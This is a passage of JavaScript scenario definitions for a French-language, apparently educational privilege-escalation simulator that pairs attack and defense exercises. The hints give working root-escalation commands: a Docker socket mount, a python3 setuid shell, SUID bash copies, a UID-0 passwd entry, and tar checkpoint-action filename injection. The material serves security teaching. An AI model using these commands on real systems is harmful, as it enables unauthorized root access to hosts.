          print('[+] "C:\\Program Files\\Common.exe" trouvé et exécuté avant le vrai binaire.', 'ok');
          print('[+] Session SYSTEM obtenue.', 'ok');
        } else {
          print('[service] UpdaterSvc démarré normalement.', 'info');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const perm = state.vfs['/mnt/c/Program Files'].perm;
    const d = permDigits(perm);
    return !permAllows(d[1],'w') && !permAllows(d[2],'w');
  },
  replay(state){
    const log=[];
    const perm = state.vfs['/mnt/c/Program Files'].perm;
    const d = permDigits(perm);
    const writable = permAllows(d[1],'w') || permAllows(d[2],'w');
    log.push({t:'$ touch "/mnt/c/Program Files/Common.exe"', cls:'prompt-line'});
    if(!writable){
      log.push({t:"touch: impossible de créer 'Common.exe': Permission non accordée", cls:'err'});
      log.push({t:'[-] Le dossier intermédiaire est désormais protégé.', cls:'err'});
      return {log, success:false};
    }
    log.push({t:'$ restart-service UpdaterSvc', cls:'prompt-line'});
    log.push({t:'[+] "C:\\Program Files\\Common.exe" trouvé et exécuté avant le vrai binaire.', cls:'ok'});
    log.push({t:'[+] Session SYSTEM obtenue.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 9. Socket Docker exposé ===================== */
{
  id:'docker-socket-writable',
  title:'Un socket Docker exposé en écriture',
  category:'Évasion de conteneur (Docker)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Le socket UNIX du démon Docker (/var/run/docker.sock) est accessible en écriture par n'importe quel utilisateur. Exploitez-le pour lancer un conteneur privilégié montant la racine de l'hôte, puis obtenez un accès root sur le système hôte.",
    hints:[
      "`ls -la /var/run/docker.sock` révèle des permissions bien trop larges sur le socket (le triplet \"autres\" ne devrait jamais inclure le bit écriture).",
      "Écrire sur ce socket équivaut à parler directement au démon Docker : quiconque le peut peut lancer n'importe quel conteneur, y compris en montant le système de fichiers de l'hôte.",
      "`docker run -v /:/mnt --rm -it alpine chroot /mnt sh` monte la racine de l'hôte dans le conteneur puis y bascule via chroot, ce qui donne un shell root sur l'hôte lui-même."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Retirez le droit d'écriture pour les autres utilisateurs sur le socket Docker, en ne laissant que le propriétaire et le groupe `docker` y accéder.",
    hints:[
      "`chmod 660 /var/run/docker.sock` retire l'accès en écriture pour \"les autres\" tout en conservant les droits du groupe docker.",
      "Vérifiez avec `ls -la /var/run/docker.sock` : le dernier triplet ne doit plus contenir de 'w'."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','var']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/var':{type:'dir',perm:'755',owner:'root',children:['run']},
      '/var/run':{type:'dir',perm:'755',owner:'root',children:['docker.sock']},
      '/var/run/docker.sock':{type:'file',perm:'666',owner:'root',size:0,content:'[socket UNIX du démon Docker]'}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^docker\s+run(?=.*-v\s+\/:\/mnt\b)(?=.*\balpine\b)(?=.*chroot\s+\/mnt\s+sh\s*$).*$/, run(state, print){
        const sock = state.vfs['/var/run/docker.sock'];
        const d = permDigits(sock.perm);
        if(permAllows(d[2],'w')){
          state.isRoot = true; state.user = 'root';
          print('[docker] conteneur alpine lancé avec / de l\'hôte monté sur /mnt.', 'info');
          print('[+] chroot /mnt sh : shell root obtenu sur l\'hôte.', 'ok');
        } else {
          print('docker: Got permission denied while trying to connect to the Docker daemon socket', 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const d = permDigits(state.vfs['/var/run/docker.sock'].perm);
    return !permAllows(d[2],'w');
  },
  replay(state){
    const log=[];
    const d = permDigits(state.vfs['/var/run/docker.sock'].perm);
    log.push({t:'$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh', cls:'prompt-line'});
    if(permAllows(d[2],'w')){
      log.push({t:'[+] chroot /mnt sh : shell root obtenu sur l\'hôte.', cls:'ok'});
      return {log, success:true};
    } else {
      log.push({t:'docker: Got permission denied while trying to connect to the Docker daemon socket', cls:'err'});
      log.push({t:'[-] Le socket ne fournit plus qu\'un accès restreint (propriétaire + groupe docker).', cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 10. Capacité cap_setuid abandonnée ===================== */
{
  id:'capability-setuid-python',
  title:'Une capacité cap_setuid oubliée sur Python',
  category:'Capacités Linux (setcap)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Un ancien script d'installation a laissé la capacité cap_setuid+ep sur l'interpréteur /usr/bin/python3, alors que plus rien n'en a besoin aujourd'hui. Repérez-la puis exploitez-la pour obtenir un shell root.",
    hints:[
      "`getcap -r / 2>/dev/null` liste tous les fichiers portant des capacités Linux non standard — contrairement au bit SUID, `ls -la` ne les révèle pas.",
      "cap_setuid+ep sur un interpréteur signifie qu'il peut s'attribuer n'importe quel UID à l'exécution, y compris 0 (root) — GTFOBins référence cette technique pour python3, perl ou ruby.",
      "`python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'` force l'UID effectif à 0 puis lance un shell."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Retirez la capacité cap_setuid de l'interpréteur Python, qui n'a aucune raison de la posséder en fonctionnement normal.",
    hints:[
      "`setcap -r /usr/bin/python3` retire toutes les capacités attachées au binaire.",
      "Vérifiez avec `getcap -r / 2>/dev/null` que /usr/bin/python3 n'apparaît plus dans la liste."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','usr']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
      '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['python3']},
      '/usr/bin/python3':{type:'file',perm:'755',owner:'root',size:5300000,content:'[interpréteur CPython 3.11]',cap:'cap_setuid+ep'}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^getcap\s+-r\s+\/(\s*2>\/dev\/null)?$/, run(state, print){
        let found = false;
        Object.keys(state.vfs).forEach(p=>{
          const n = state.vfs[p];
          if(n.type==='file' && n.cap){ print(`${p} = ${n.cap}`, 'out'); found = true; }
        });
        if(!found) print('(aucune capacité non standard détectée)', 'info');
      }
    },
    { pattern:/^python3\s+-c\s+.*os\.setuid\(0\).*os\.system\(.*\/bin\/(sh|bash).*$/, run(state, print){
        const node = state.vfs['/usr/bin/python3'];
        if(node && node.cap){
          state.isRoot = true; state.user = 'root';
          print('[+] os.setuid(0) accepté grâce à cap_setuid+ep : UID effectif désormais 0.', 'ok');
          print('[+] Shell root obtenu.', 'ok');
        } else {
          print('OSError: [Errno 1] Operation not permitted', 'err');
        }
      }
    },
    { pattern:/^setcap\s+-r\s+\/usr\/bin\/python3$/, run(state, print){
        state.vfs['/usr/bin/python3'].cap = null;
        print('[setcap] toutes les capacités ont été retirées de /usr/bin/python3.', 'info');
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return !state.vfs['/usr/bin/python3'].cap; },
  replay(state){
    const log=[];
    const node = state.vfs['/usr/bin/python3'];
    log.push({t:'$ python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\'', cls:'prompt-line'});
    if(node.cap){
      log.push({t:'[+] os.setuid(0) accepté grâce à cap_setuid+ep.', cls:'ok'});
      log.push({t:'[+] Shell root obtenu.', cls:'ok'});
      return {log, success:true};
    } else {
      log.push({t:'OSError: [Errno 1] Operation not permitted', cls:'err'});
      log.push({t:"[-] Plus aucune capacité privilégiée sur l'interpréteur.", cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 11. Détournement de $PATH via un cron root ===================== */
{
  id:'path-hijack-cron',
  title:'Un cron root vulnérable au détournement de $PATH',
  category:'Détournement de $PATH',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Une tâche cron exécutée par root lance un script d'entretien par son simple nom, sans chemin absolu, avec un $PATH personnalisé dont le premier dossier est modifiable par tous. Déposez-y un exécutable portant le même nom pour le faire exécuter à la place du vrai, avec les privilèges root.",
    hints:[
      "`cat /etc/cron.d/maintenance` montre que root exécute la commande `disk-cleanup` sans chemin absolu, avec un PATH personnalisé commençant par /opt/scripts.",
      "`ls -la /opt/scripts` révèle que ce dossier, placé en tête du PATH de la tâche, est modifiable par n'importe qui.",
      "`touch /opt/scripts/disk-cleanup` crée le fichier, puis `nano /opt/scripts/disk-cleanup` permet d'y écrire un script qui copie /bin/bash vers /tmp/rootbash en lui donnant un bit SUID (`cp /bin/bash /tmp/rootbash` puis `chmod u+s /tmp/rootbash`).",
      "Une fois le script prêt, tapez `attendre-cron` pour simuler l'exécution planifiée, puis lancez `/tmp/rootbash -p`."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Corrigez les permissions de /opt/scripts afin qu'il ne soit plus modifiable par un utilisateur non privilégié.",
    hints:[
      "`chmod 755 /opt/scripts` retire le droit d'écriture au groupe et aux autres, ne laissant que root y déposer des fichiers.",
      "Dans l'idéal, la tâche cron devrait aussi appeler le script par son chemin absolu plutôt que de compter sur le $PATH — mais corriger cette permission suffit à bloquer l'attaque."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','opt','etc','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/opt':{type:'dir',perm:'755',owner:'root',children:['scripts']},
      '/opt/scripts':{type:'dir',perm:'777',owner:'root',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['cron.d']},
      '/etc/cron.d':{type:'dir',perm:'755',owner:'root',children:['maintenance']},
      '/etc/cron.d/maintenance':{type:'file',perm:'644',owner:'root',size:60,
        content:"PATH=/opt/scripts:/usr/bin:/bin\n* * * * * root disk-cleanup\n"},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^attendre-cron$|^sleep\s+\d+$/, run(state, print){
        const dir = state.vfs['/opt/scripts'];
        const script = state.vfs['/opt/scripts/disk-cleanup'];
        const injected = script && /\/tmp\/rootbash/.test(script.content) && /chmod\s+u\+s/.test(script.content);
        print("[cron] exécution planifiée de la tâche 'maintenance' par root...", 'info');
        print("[cron] PATH=/opt/scripts:/usr/bin:/bin -> recherche de 'disk-cleanup'...", 'info');
        if(injected && dir.children.includes('disk-cleanup')){
          print("[cron] 'disk-cleanup' trouvé dans /opt/scripts (avant /usr/bin) et exécuté en tant que root.", 'info');
          state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
          if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
          print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
        } else {
          print("[cron] tâche exécutée sans anomalie détectée.", 'info');
        }
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via /tmp/rootbash -p.", 'ok');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const d = permDigits(state.vfs['/opt/scripts'].perm);
    return !permAllows(d[1],'w') && !permAllows(d[2],'w');
  },
  replay(state){
    const log=[];
    const d = permDigits(state.vfs['/opt/scripts'].perm);
    const writable = permAllows(d[1],'w') || permAllows(d[2],'w');
    log.push({t:"$ touch /opt/scripts/disk-cleanup", cls:'prompt-line'});
    if(!writable){
      log.push({t:"touch: impossible de créer 'disk-cleanup': Permission non accordée", cls:'err'});
      log.push({t:"[-] /opt/scripts est désormais protégé en écriture.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"[cron] exécution planifiée de la tâche 'maintenance' par root...", cls:'info'});
    log.push({t:"[+] /tmp/rootbash créé avec un bit SUID root.", cls:'ok'});
    log.push({t:"$ /tmp/rootbash -p", cls:'prompt-line'});
    log.push({t:"[+] Shell root obtenu.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 12. /etc/passwd modifiable par tous ===================== */
{
  id:'passwd-world-writable',
  title:'Le fichier /etc/passwd modifiable par tous',
  category:'Fichier système critique (/etc/passwd)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Le fichier /etc/passwd, qui définit les comptes du système, est accessible en écriture par n'importe quel utilisateur. Ajoutez-y une entrée avec l'UID 0 (équivalent à root) et basculez dessus.",
    hints:[
      "`ls -la /etc/passwd` montre des permissions bien trop larges pour un fichier aussi sensible.",
      "Une ligne au format `nom:mot_de_passe:UID:GID:commentaire:home:shell` avec l'UID 0 donne les mêmes privilèges que root, quel que soit le nom choisi.",
      "`nano /etc/passwd` permet d'ajouter une ligne comme `pwned::0:0:pwned:/root:/bin/bash` (mot de passe vide accepté par ce système simulé).",
      "Une fois la ligne ajoutée, `su pwned` bascule sur ce compte, désormais UID 0."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Corrigez les permissions de /etc/passwd afin qu'il ne soit plus modifiable par un utilisateur non privilégié — seule la lecture doit rester ouverte à tous, comme l'exigent de nombreux outils système.",
    hints:[
      "`chmod 644 /etc/passwd` restaure des permissions saines : écriture réservée à root, lecture ouverte à tous."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','root']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['passwd']},
      '/etc/passwd':{type:'file',perm:'666',owner:'root',size:80,
        content:"root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000:bob:/home/bob:/bin/bash\n"},
      '/root':{type:'dir',perm:'700',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^su\s+\S+$/, run(state, print){
        const content = state.vfs['/etc/passwd'].content;
        const lines = content.split('\n').filter(Boolean);
        const rootLikeUsers = lines.filter(l=>{
          const parts = l.split(':');
          return parts[2] === '0' && parts[0] !== 'root';
        });
        if(rootLikeUsers.length > 0){
          state.isRoot = true;
          state.user = rootLikeUsers[0].split(':')[0];
          print("[su] authentification acceptée (mot de passe vide).", 'info');
          print(`[+] Session ouverte en tant que ${state.user} (UID 0) — équivalent root.`, 'ok');
        } else {
          print('su: Authentification échouée', 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const d = permDigits(state.vfs['/etc/passwd'].perm);
    return !permAllows(d[1],'w') && !permAllows(d[2],'w');
  },
  replay(state){
    const log=[];
    const d = permDigits(state.vfs['/etc/passwd'].perm);
    const writable = permAllows(d[1],'w') || permAllows(d[2],'w');
    log.push({t:"$ nano /etc/passwd   (ajout de : pwned::0:0:pwned:/root:/bin/bash)", cls:'prompt-line'});
    if(!writable){
      log.push({t:"nano: [Impossible d'écrire dans /etc/passwd] Permission non accordée", cls:'err'});
      log.push({t:"[-] Le fichier est désormais protégé en écriture.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"$ su pwned", cls:'prompt-line'});
    log.push({t:"[+] Session ouverte en tant que pwned (UID 0) — équivalent root.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 13. /etc/shadow lisible par tous ===================== */
{
  id:'shadow-world-readable',
  title:'Le fichier /etc/shadow lisible par tous',
  category:'Fichier système critique (/etc/shadow)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"/etc/shadow, qui contient les empreintes (hash) des mots de passe, est lisible par n'importe quel utilisateur. Exfiltrez le hash du compte root.",
    hints:[
      "`ls -la /etc/shadow` montre des permissions bien trop larges pour un fichier aussi sensible (normalement réservé à root).",
      "`cat /etc/shadow` affiche directement les empreintes si le fichier est lisible par tous.",
      "Un hash exfiltré peut ensuite être soumis hors ligne à une attaque par dictionnaire (John the Ripper, hashcat) — hors du périmètre de ce simulateur, mais la fuite en elle-même constitue déjà la faille exploitée."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Restreignez les permissions de /etc/shadow à root uniquement (600), comme c'est le standard sur tout système Linux durci.",
    hints:[
      "`chmod 600 /etc/shadow` : lecture et écriture réservées au seul propriétaire, root."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['shadow']},
      '/etc/shadow':{type:'file',perm:'644',owner:'root',size:120,
        content:"root:$6$rK3f9$9f8b2b7e6b1c4e2f0a3d5c6e7f8a9b0c1d2e3f4a5b6c7d8e:19700:0:99999:7:::\nbob:$6$pQ7z2$1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f:19700:0:99999:7:::\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[],
  onCat(state, node, path, print){
    if(path === '/etc/shadow' && !state.isRoot){
      state.flags = state.flags || {};
      state.flags.shadowRead = true;
      print("[+] Empreintes de mots de passe exfiltrées, y compris celle de root.", 'ok');
      print('FLAG{etc_shadow_lisible_par_tous}', 'flagline');
    }
  },
  attackCheck(state){ return state.flags && state.flags.shadowRead === true; },
  defenseCheck(state){
    const perm = state.vfs['/etc/shadow'].perm;
    const d = permDigits(perm);
    return !permAllows(d[1],'r') && !permAllows(d[2],'r');
  },
  replay(state){
    const log=[];
    const perm = state.vfs['/etc/shadow'].perm;
    const d = permDigits(perm);
    log.push({t:"$ cat /etc/shadow", cls:'prompt-line'});
    if(permAllows(d[2],'r') || permAllows(d[1],'r')){
      log.push({t:"root:$6$rK3f9$9f8b2b7e6b1c4e2f... [...]", cls:'out'});
      log.push({t:"[+] Empreintes exfiltrées, y compris celle de root.", cls:'ok'});
      return {log, success:true};
    } else {
      log.push({t:"cat: /etc/shadow: Permission non accordée", cls:'err'});
      log.push({t:"[-] Le fichier n'est plus lisible que par root.", cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 14. Sudo env_keep LD_PRELOAD ===================== */
{
  id:'sudo-ld-preload',
  title:'Une règle sudo qui conserve LD_PRELOAD',
  category:'Configuration sudo (env_keep)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"La configuration sudo de bob conserve la variable d'environnement LD_PRELOAD (env_keep+=LD_PRELOAD) pour l'exécution de /usr/bin/vim en NOPASSWD. Déposez une bibliothèque partagée piégée puis faites-la charger avant l'exécution pour obtenir un shell root.",
    hints:[
      "`sudo -l` révèle la ligne `Defaults:bob env_keep+=LD_PRELOAD` ainsi que `/usr/bin/vim` en NOPASSWD.",
      "GTFOBins référence cette technique : une bibliothèque .so injectée via LD_PRELOAD s'exécute avec les privilèges du binaire lancé, avant même son code principal.",
      "`touch /tmp/x.so` dépose la bibliothèque piégée (déjà préparée) dans /tmp.",
      "`sudo LD_PRELOAD=/tmp/x.so vim` charge cette bibliothèque avec les privilèges root accordés par sudo."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Modifiez la configuration sudo de bob afin qu'elle ne conserve plus la variable LD_PRELOAD lors de l'exécution de commandes en tant que root.",
    hints:[
      "Ouvrez `/etc/sudoers.d/bob` avec `nano` et supprimez la ligne `Defaults:bob env_keep+=LD_PRELOAD`."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','usr','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['sudoers.d']},
      '/etc/sudoers.d':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/etc/sudoers.d/bob':{type:'file',perm:'440',owner:'root',size:90,
        content:"Defaults:bob env_keep+=LD_PRELOAD\nbob ALL=(root) NOPASSWD: /usr/bin/vim\n"},
      '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
      '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['vim']},
      '/usr/bin/vim':{type:'file',perm:'755',owner:'root',size:3200000,content:'[binaire vim]'},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^sudo\s+-l$/, run(state, print){
        print(`Utilisateur ${state.user} peut exécuter les commandes suivantes sur target-lab :`, 'out');
        print(state.vfs['/etc/sudoers.d/bob'].content.trimEnd(), 'out');
      }
    },
    { pattern:/^sudo\s+LD_PRELOAD=\/tmp\/x\.so\s+vim$/, run(state, print){
        const rule = state.vfs['/etc/sudoers.d/bob'].content;
        const preloadKept = /env_keep\s*\+?=\s*LD_PRELOAD/.test(rule);
        const vimAllowed = /NOPASSWD\s*:\s*\/usr\/bin\/vim/.test(rule);
        const planted = state.vfs['/tmp/x.so'];
        if(!vimAllowed){
          print(`Sorry, user ${state.user} is not allowed to execute '/usr/bin/vim' as root.`, 'err');
          return;
        }
        if(!preloadKept){
          print('vim: LD_PRELOAD ignoré (variable non conservée par sudo)', 'err');
          return;
        }
        if(!planted){
          print("sudo: LD_PRELOAD: /tmp/x.so: Aucun fichier ou dossier de ce type", 'err');
          return;
        }
        state.isRoot = true; state.user = 'root';
        print('[+] /tmp/x.so chargé avant vim, avec les privilèges root accordés par sudo.', 'ok');
        print('[+] Shell root obtenu.', 'ok');
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const rule = state.vfs['/etc/sudoers.d/bob'].content;
    return !/env_keep\s*\+?=\s*LD_PRELOAD/.test(rule);
  },
  replay(state){
    const log=[];
    const rule = state.vfs['/etc/sudoers.d/bob'].content;
    const preloadKept = /env_keep\s*\+?=\s*LD_PRELOAD/.test(rule);
    log.push({t:'$ sudo LD_PRELOAD=/tmp/x.so vim', cls:'prompt-line'});
    if(preloadKept){
      log.push({t:'[+] /tmp/x.so chargé avant vim, avec les privilèges root.', cls:'ok'});
      log.push({t:'[+] Shell root obtenu.', cls:'ok'});
      return {log, success:true};
    } else {
      log.push({t:'vim: LD_PRELOAD ignoré (variable non conservée par sudo)', cls:'err'});
      log.push({t:"[-] La configuration sudo ne conserve plus LD_PRELOAD.", cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 15. Unité systemd modifiable ===================== */
{
  id:'systemd-unit-writable',
  title:'Un script de service systemd modifiable par tous',
  category:'Service systemd',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Une unité systemd exécutée en root lance un script dont les permissions sont trop permissives. Modifiez ce script, puis provoquez le redémarrage du service pour obtenir un shell root.",
    hints:[
      "`cat /etc/systemd/system/backup-agent.service` montre que le service lance /usr/local/bin/backup-agent.sh en tant que root.",
      "`ls -la /usr/local/bin/backup-agent.sh` montre des permissions d'écriture ouvertes à tous.",
      "`nano /usr/local/bin/backup-agent.sh` permet d'y ajouter des lignes qui copient /bin/bash vers /tmp/rootbash en lui donnant un bit SUID.",
      "`systemctl restart backup-agent` simule le redémarrage du service, qui exécute alors votre script modifié en tant que root ; lancez ensuite `/tmp/rootbash -p`."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Corrigez les permissions du script afin qu'il ne soit plus modifiable que par root, sans casser le fonctionnement normal du service.",
    hints:[
      "`chmod 700 /usr/local/bin/backup-agent.sh` retire tout droit d'écriture au groupe et aux autres."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','usr','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['systemd']},
      '/etc/systemd':{type:'dir',perm:'755',owner:'root',children:['system']},
      '/etc/systemd/system':{type:'dir',perm:'755',owner:'root',children:['backup-agent.service']},
      '/etc/systemd/system/backup-agent.service':{type:'file',perm:'644',owner:'root',size:140,
        content:"[Unit]\nDescription=Agent de sauvegarde\n[Service]\nUser=root\nExecStart=/usr/local/bin/backup-agent.sh\n[Install]\nWantedBy=multi-user.target\n"},
      '/usr':{type:'dir',perm:'755',owner:'root',children:['local']},
      '/usr/local':{type:'dir',perm:'755',owner:'root',children:['bin']},
      '/usr/local/bin':{type:'dir',perm:'755',owner:'root',children:['backup-agent.sh']},
      '/usr/local/bin/backup-agent.sh':{type:'file',perm:'766',owner:'root',size:90,
        content:"#!/bin/bash\n# Agent de sauvegarde\nrsync -a /data /backup/\n"},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^systemctl\s+restart\s+backup-agent$/, run(state, print){
        const script = state.vfs['/usr/local/bin/backup-agent.sh'];
        const injected = /\/tmp\/rootbash/.test(script.content) && /chmod\s+u\+s/.test(script.content);
        print("[systemd] redémarrage de backup-agent.service (User=root)...", 'info');
        if(injected){
          state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
          if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
          print("[systemd] backup-agent.sh exécuté avec succès.", 'info');
          print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
        } else {
          print("[systemd] backup-agent.sh exécuté avec succès (rien d'anormal détecté).", 'info');
        }
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via /tmp/rootbash -p.", 'ok');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const perm = state.vfs['/usr/local/bin/backup-agent.sh'].perm;
    const d = permDigits(perm);
    return !permAllows(d[1],'w') && !permAllows(d[2],'w');
  },
  replay(state){
    const log=[];
    const script = state.vfs['/usr/local/bin/backup-agent.sh'];
    const d = permDigits(script.perm);
    const writable = permAllows(d[1],'w') || permAllows(d[2],'w');
    log.push({t:"$ echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /usr/local/bin/backup-agent.sh", cls:'prompt-line'});
    if(!writable){
      log.push({t:"bash: /usr/local/bin/backup-agent.sh: Permission non accordée", cls:'err'});
      log.push({t:"[-] Impossible d'altérer le script : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"[systemd] redémarrage de backup-agent.service (User=root)...", cls:'info'});
    log.push({t:"[+] /tmp/rootbash créé avec un bit SUID root.", cls:'ok'});
    log.push({t:"$ /tmp/rootbash -p", cls:'prompt-line'});
    log.push({t:"[+] Shell root obtenu.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 16. Injection par wildcard tar ===================== */
{
  id:'tar-wildcard-injection',
  title:"Le script de sauvegarde vulnérable à l'injection par wildcard",
  category:'Injection par caractère générique (tar wildcard)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Une tâche cron root archive un dossier partagé avec un joker `*` mal maîtrisé. Détournez le développement de ce joker par tar pour exécuter du code en root (technique GTFOBins).",
    hints:[
      "`cat /etc/cron.d/tarbackup` montre qu'une tâche root exécute `tar czf /backup/home.tar.gz *` dans /home/partage, chaque minute.",
      "`ls -la /home/partage` révèle un dossier ouvert en écriture à tout le monde (777) : les noms de fichiers qu'il contient seront développés par le joker `*` et interprétés comme des options par tar.",
      "Placez-vous dans le dossier (`cd /home/partage`) puis créez deux fichiers spécialement nommés : `touch --checkpoint=1` et `touch \"--checkpoint-action=exec=sh payload.sh\"` détournent tar vers l'exécution d'un script (technique GTFOBins).",
      "Créez enfin `payload.sh` (`touch payload.sh` puis `nano payload.sh`) avec un contenu qui copie /bin/bash vers /tmp/rootbash et lui ajoute le bit SUID. Tapez ensuite `attendre-cron` pour simuler l'exécution planifiée, puis lancez `/tmp/rootbash -p`."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Empêchez l'injection de faux noms de fichiers dans le dossier archivé par la tâche cron, sans casser la sauvegarde légitime.",
    hints:[
      "`chmod 750 /home/partage` retire le droit d'écriture aux autres utilisateurs : ils ne peuvent plus injecter de noms de fichiers spéciaux dans le dossier sauvegardé.",
      "root (propriétaire) conserve tous ses droits ; seuls les tiers non autorisés perdent l'écriture."
    ]
  },
  makeVfs(){
    return {
